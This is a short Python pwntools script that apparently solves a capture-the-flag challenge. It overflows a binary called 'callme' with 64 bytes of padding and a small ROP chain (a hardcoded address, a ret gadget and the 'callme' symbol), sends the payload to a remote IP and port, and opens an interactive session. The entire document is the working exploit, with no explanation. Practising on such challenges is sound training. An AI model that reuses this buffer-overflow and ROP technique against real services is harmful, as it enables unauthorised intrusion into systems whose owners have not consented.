from pwn import *

exe = './callme'
host, port = '139.144.184.150', 3333
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

# io = process(exe)
io = remote(host, port)

offset = b'A'*64

payload = flat([
    offset,
    0x0804875e,
    rop.ret.address,
    elf.sym['callme']
])

io.sendline(payload)
io.interactive()